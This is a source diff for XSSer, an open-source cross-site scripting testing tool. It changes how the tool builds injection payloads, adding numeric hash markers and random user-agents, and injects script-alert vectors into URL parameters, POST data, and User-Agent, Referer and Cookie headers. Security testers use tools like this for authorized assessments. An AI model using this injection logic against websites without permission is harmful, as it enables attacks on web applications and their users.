@@ -6,7 +6,7 @@ $Id$
 
 This file is part of the xsser project, http://xsser.03c8.net
 
-Copyright (c) 2011/2016 psy <epsylon@riseup.net>
+Copyright (c) 2011/2018 psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -21,7 +21,8 @@ You should have received a copy of the GNU General Public License along
 with xsser; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, re, sys, datetime, hashlib, time, urllib, cgi, traceback, webbrowser
+import os, re, sys, datetime, hashlib, time, urllib, cgi, traceback, webbrowser, random
+from random import randint
 import core.fuzzing
 import core.fuzzing.vectors
 import core.fuzzing.DCP
@@ -89,14 +90,12 @@ class xsser(EncoderDecoder, XSSerReporter):
 
         # initialize the url encoder/decoder
         EncoderDecoder.__init__(self)
+
         # your unique real opponent
         self.time = datetime.datetime.now()
 
         # this payload comes with vector already..
-        #self.DEFAULT_XSS_PAYLOAD = "<img src=x onerror=alert('XSS')>"
         self.DEFAULT_XSS_PAYLOAD = 'XSS'
-        #self.DEFAULT_XSS_VECTOR = '">PAYLOAD'
-        self.DEFAULT_XSS_VECTOR = ''
 
         # to be or not to be...
         self.hash_found = []
@@ -110,8 +109,6 @@ class xsser(EncoderDecoder, XSSerReporter):
         self.errors_isalive = 0
         self.next_isalive = False
         self.flag_isalive_num = 0
-        #self.errors_jumper = 0
-        #self.next_jumper = False
         
         # some controls about targets
         self.urlspoll = []
@@ -217,6 +214,13 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         return hashlib.md5(str(datetime.datetime.now()) + attack_type).hexdigest()
 
+    def generate_numeric_hash(self): # 32 length as md5
+        """
+        Generate a new hash for numeric only XSS
+        """
+        newhash = ''.join(random.choice('0123456789') for i in range(32)) 
+        return newhash
+
     def report(self, msg, level='info'):
         """
         Report some error from the application.
@@ -258,7 +262,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                         'xforw', 'xclient', 'threads', 
                         'dropcookie', 'followred', 'fli',
                         'nohead', 'isalive', 'alt', 'altm',
-                        'ald', 'jumper'
+                        'ald'
 			]:
             if hasattr(options, opt) and getattr(options, opt):
                 setattr(Curl, opt, getattr(options, opt))
@@ -374,7 +378,6 @@ class xsser(EncoderDecoder, XSSerReporter):
                     payloads = payloads + payloads_dom
             elif options.dom:
                 payloads = payloads + payloads_dom
-            
         elif options.dcp:
             payloads = payloads_dcp
             if options.script:
@@ -411,7 +414,6 @@ class xsser(EncoderDecoder, XSSerReporter):
                     payloads = payloads + payloads_dom
             elif options.dom:
                 payloads = payloads + payloads_dom
-
         elif options.script:
             payloads = manual_payload
             if options.hash:
@@ -460,14 +462,12 @@ class xsser(EncoderDecoder, XSSerReporter):
                 payloads = payloads + payloads_dom
         elif options.dom:
             payloads = payloads_dom
-
         elif not options.fuzz and not options.dcp and not options.script and not options.hash and not options.inducedcode and not options.heuristic and not options.dom:
             payloads = [{"payload":'">PAYLOAD',
 			 "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"
                          }]
         else:
             payloads = checker_payload
-
         return payloads
 
     def process_ipfuzzing(self, text):
@@ -600,8 +600,17 @@ class xsser(EncoderDecoder, XSSerReporter):
 
         # substitute the attack hash
         url_orig_hash = self.generate_hash('url')
-        payload_string = payload_string.replace('PAYLOAD', self.DEFAULT_XSS_PAYLOAD)
-        hashed_payload = payload_string.replace('XSS', url_orig_hash)
+        if 'XSS' in payload_string or 'PAYLOAD' in payload_string or 'VECTOR' in payload_string:
+            payload_string = payload_string.replace('PAYLOAD', self.DEFAULT_XSS_PAYLOAD)
+            payload_string = payload_string.replace('VECTOR', self.DEFAULT_XSS_PAYLOAD)
+            hashed_payload = payload_string.replace('XSS', url_orig_hash)
+        elif "1" in payload_string:
+            url_orig_hash = self.generate_numeric_hash()
+            hashed_payload = payload_string.replace('1', url_orig_hash) # adding numeric XSS (ex: alert('1'))
+        else:
+            print "\n[Error] You aren't using a valid keyword: 'XSS', '1', 'PAYLOAD', 'VECTOR'... for your --payload. Aborting...\n"
+            print("="*75 + "\n") 
+            sys.exit(2)
 
         if options.imperva:
             hashed_payload = urllib.urlencode({'':hashed_payload})
@@ -640,20 +649,21 @@ class xsser(EncoderDecoder, XSSerReporter):
         else:
             for key, value in target_params.iteritems(): # parse params searching for keywords
                 for v in value:
-                    if v == 'XSS' or v == 'VECTOR': # input keywords to inject payload
+                    if v == 'XSS': # input keywords to inject payload
                         target_params[key] = hashed_vector_url
                         url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                         hashed_payload = payload_string.replace('XSS', url_orig_hash)
                         hashed_vector_url = self.encoding_permutations(hashed_payload)
                     else:
                         target_params[key] = v
+            payload_url = query_string.strip() + hashed_vector_url
             target_url_params = urllib.urlencode(target_params)
             dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
         if options.postdata: # using POST provided by parameter (-p)
             target_params = parse_qs(query_string, keep_blank_values=True)
             for key, value in target_params.iteritems(): # parse params searching for keywords
                 for v in value:
-                    if v == 'XSS' or v == 'VECTOR': # input keywords to inject payload
+                    if v == 'XSS': # input keywords to inject payload
                         target_params[key] = hashed_vector_url
                         url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                         hashed_payload = payload_string.replace('XSS', url_orig_hash)
@@ -676,7 +686,6 @@ class xsser(EncoderDecoder, XSSerReporter):
         _error_cb = self.error_attack_url_payload
         def _error_cb(request, error):
             self.error_attack_url_payload(c, url, request, error)
-
         if self.options.getdata or not self.options.postdata:
             dest_url, newhash = self.get_url_payload(url, payload, query_string)
             if (self.options.xsa or self.options.xsr or self.options.coo):
@@ -686,11 +695,9 @@ class xsser(EncoderDecoder, XSSerReporter):
                 c.cookie = cookie
             pool.addRequest(c.get, [[dest_url]], _cb, _error_cb)
             self._ongoing_requests += 1
-
         if self.options.postdata:
             dest_url, newhash = self.get_url_payload("", payload, query_string)
             dest_url = dest_url.strip().replace("/", "", 1)
-            #self.report("\nSending POST:", urllib.unquote(dest_url), "\n")
             if (self.options.xsa or self.options.xsr or self.options.coo):
                 agent, referer, cookie = self._prepare_extra_attacks(payload)
                 c.agent = agent
@@ -717,20 +724,11 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def finish_attack_url_payload(self, c, request, result, payload,
                                   query_string, url, orig_hash):
-        #if self.next_jumper == True:
-        #    self.next_jumper = False
-        #    return
-        #else:
         self.report('='*75)
         self.report("Target: " + url + " --> " + str(self.time))
         self.report('='*75 + "\n")
-
-        #self.report(self.urlspoll)
-
         self._ongoing_requests -= 1
         dest_url = request.args[0]
-        #self.report(dest_url)
-
         # adding constant head check number flag
         if self.options.isalive:
             self.flag_isalive_num = int(self.options.isalive)
@@ -1983,7 +1981,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             time.sleep(0.2)
             for reporter in self._reporters:
                 reporter.report_state('final sweep..')
-        print("="*75 + "\n")
+        print("\n" + "="*75 + "\n")
         if self.pool:
             self.pool.dismissWorkers(len(self.pool.workers))
             self.pool.joinAllDismissedWorkers()
@@ -2035,9 +2033,16 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         Setup extra attacks.
         """
+        agents = [] # user-agents
+        try:
+            f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
+        except:
+            f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
+        for line in f:
+            agents.append(line)
+        agent = random.choice(agents).strip() # set random user-agent
+        referer = "127.0.0.1"
         options = self.options
-        agent = None
-        referer = None
         cookie = None
         if 'PAYLOAD' in payload['payload']: # auto
             if options.xsa:
@@ -2045,11 +2050,17 @@ class xsser(EncoderDecoder, XSSerReporter):
                 agent = payload['payload'].replace('PAYLOAD', hashing)
                 self._ongoing_attacks['xsa'] = hashing
                 self.xsa_injection = self.xsa_injection + 1
+            else:
+                if options.agent:
+                    agent = options.agent
             if options.xsr:
                 hashing = self.generate_hash('xsr')
                 referer = payload['payload'].replace('PAYLOAD', hashing)
                 self._ongoing_attacks['xsr'] = hashing
                 self.xsr_injection = self.xsr_injection + 1
+            else:
+                if options.referer:
+                    referer = options.referer
             if options.coo:
                 hashing = self.generate_hash('cookie')
                 cookie = payload['payload'].replace('PAYLOAD', hashing)
@@ -2061,14 +2072,42 @@ class xsser(EncoderDecoder, XSSerReporter):
                 agent = payload['payload'].replace('XSS', hashing)
                 self._ongoing_attacks['xsa'] = hashing
                 self.xsa_injection = self.xsa_injection + 1
+            else:
+                if options.agent:
+                    agent = options.agent
             if options.xsr:
                 hashing = self.generate_hash('xsr')
                 referer = payload['payload'].replace('XSS', hashing)
                 self._ongoing_attacks['xsr'] = hashing
                 self.xsr_injection = self.xsr_injection + 1
+            else:
+                if options.referer:
+                    referer = options.referer
             if options.coo:
                 hashing = self.generate_hash('cookie')
                 cookie = payload['payload'].replace('XSS', hashing)
+                self._ongoing_attacks['cookie'] = hashing
+                self.coo_injection = self.coo_injection + 1
+        elif '1' in payload['payload']: # manual
+            if options.xsa:
+                hashing = self.generate_numeric_hash()
+                agent = payload['payload'].replace('1', hashing)
+                self._ongoing_attacks['xsa'] = hashing
+                self.xsa_injection = self.xsa_injection + 1
+            else:
+                if options.agent:
+                    agent = options.agent
+            if options.xsr:
+                hashing = self.generate_numeric_hash()
+                referer = payload['payload'].replace('1', hashing)
+                self._ongoing_attacks['xsr'] = hashing
+                self.xsr_injection = self.xsr_injection + 1
+            else:
+                if options.referer:
+                    referer = options.referer
+            if options.coo:
+                hashing = self.generate_numeric_hash()
+                cookie = payload['payload'].replace('1', hashing)
                 self._ongoing_attacks['cookie'] = hashing
                 self.coo_injection = self.coo_injection + 1
         else: # default
@@ -2077,11 +2116,17 @@ class xsser(EncoderDecoder, XSSerReporter):
                 agent = "<script>alert('" + hashing + "')</script>"
                 self._ongoing_attacks['xsa'] = hashing
                 self.xsa_injection = self.xsa_injection + 1
+            else:
+                if options.agent:
+                    agent = options.agent
             if options.xsr:
                 hashing = self.generate_hash('xsr')
                 referer = "<script>alert('" + hashing + "')</script>"
                 self._ongoing_attacks['xsr'] = hashing
                 self.xsr_injection = self.xsr_injection + 1
+            else:
+                if options.referer:
+                    referer = options.referer
             if options.coo:
                 hashing = self.generate_hash('cookie')
                 cookie = "<script>alert('" + hashing + "')</script>"
